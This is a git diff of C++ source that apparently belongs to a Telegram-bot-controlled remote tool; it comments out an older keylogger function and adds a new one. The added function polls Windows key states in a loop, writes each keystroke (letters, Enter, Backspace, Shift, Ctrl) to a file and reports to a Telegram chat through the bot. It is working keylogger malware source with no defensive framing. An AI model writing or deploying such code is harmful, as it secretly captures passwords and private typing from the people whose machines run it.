@@ -1,7 +1,8 @@
 #include "keyLogger.h"
 #include "globals.h"
 
-void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id) {
+// Not efficient keyLogger
+/*void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id) {
 	using namespace std;
 
 	while (isKeyLoggerRunning)
@@ -41,4 +42,53 @@ void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id) {
 		}
 		outfile.close();
 	}
+}*/
+
+
+void startKeyLogger(const TgBot::Bot& bot_ref, int64_t chat_id) {
+    using namespace std;
+
+    ofstream outfile(filename, ios::app);
+    if (!outfile) {
+        bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
+        return;
+    }
+
+    unordered_map<int, bool> pressedKeys;
+
+    while (isKeyLoggerRunning) {
+        bool keyLogged = false;
+
+        for (int i = 0x08; i <= 0xA2; i++) {
+            bool isPressed = GetAsyncKeyState(i) & 0x8000;
+
+            if (isPressed && !pressedKeys[i]) {
+                pressedKeys[i] = true;
+                keyLogged = true;
+
+                if (i >= 0x30 && i <= 0x5A)
+                    outfile << (char)i;
+                else if (i == VK_RETURN)
+                    outfile << "[ENTER]\n";
+                else if (i == VK_BACK)
+                    outfile << "[BACKSPACE]";
+                else if (i == VK_SPACE)
+                    outfile << ' ';
+                else if (i == VK_SHIFT)
+                    outfile << "[SHIFT]";
+                else if (i == VK_CONTROL)
+                    outfile << "[CTRL]";
+            }
+            else if (!isPressed) {
+                pressedKeys[i] = false;
+            }
+        }
+
+        if (keyLogged)
+            outfile.flush();
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+
+    outfile.close();
 }
